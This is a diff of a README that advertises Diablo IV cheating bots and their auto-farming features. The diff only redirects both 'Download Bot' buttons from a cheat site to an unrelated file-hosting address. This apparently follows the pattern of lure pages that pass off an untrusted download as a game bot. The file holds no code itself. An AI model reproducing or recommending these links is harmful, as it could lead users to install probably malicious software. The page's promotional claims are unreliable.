@@ -4,7 +4,7 @@
 
 Diablo IV’s vast open-world and farming loops can be time-consuming. Bots like **Orion**, **Atlas Assist**, and community scripts take over the grind: they **auto‑navigate zones, fight monsters, pick up loot, heal, repair gear, and even sell items**—ideal for solo PvE or grinding in private sessions .
 
-[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://wecheaters.github.io/cheats/diablo-iv/)
+[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🛠️ Core Bot Features
@@ -16,7 +16,7 @@ Diablo IV’s vast open-world and farming loops can be time-consuming. Bots li
 * **24/7 Operation** – Runs continuously with minimal supervision 
 * **Semi-Automatic Tools** – Like Atlas Assist, which offers GUI customization, combo execution, and auto‑potion support 
 
-[![Download Bot](http://i.epvpimg.com/bEgCaab.png)](https://wecheaters.github.io/cheats/diablo-iv/)
+[![Download Bot](http://i.epvpimg.com/bEgCaab.png)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🔍 What the Community Is Saying
@@ -65,3 +65,4 @@ Bots are great for efficient progression—especially in solo play or private fa
 * **EliteGamingBot** – Commercial bot offering full 24/7 farming support 
 
 ---
+
